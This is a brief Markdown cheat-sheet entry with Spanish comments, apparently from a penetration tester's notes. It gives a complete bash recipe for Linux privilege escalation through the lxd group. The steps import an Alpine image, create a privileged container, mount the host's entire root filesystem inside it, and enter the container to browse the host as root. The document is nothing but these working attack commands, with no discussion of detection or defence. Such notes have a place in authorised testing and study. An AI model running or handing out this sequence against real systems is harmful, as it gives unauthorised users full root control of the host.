---
tags: [privesc, linux, lxd]
---

# LXC/LXD Group

```bash
# 1. Importar imagen
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# 2. Iniciar proceso LXD
lxd init   # confirmar todos los prompts

# 3. Iniciar contenedor privilegiado
lxc init alpine r00t -c security.privileged=true

# 4. Montar sistema de ficheros del host
lxc config device add r00t mydev disk source=/ path=/mnt/root

# 5. Arrancar y entrar
lxc start r00t
lxc exec r00t /bin/sh

# Explorar el host montado como root
cd /mnt/root/root
```

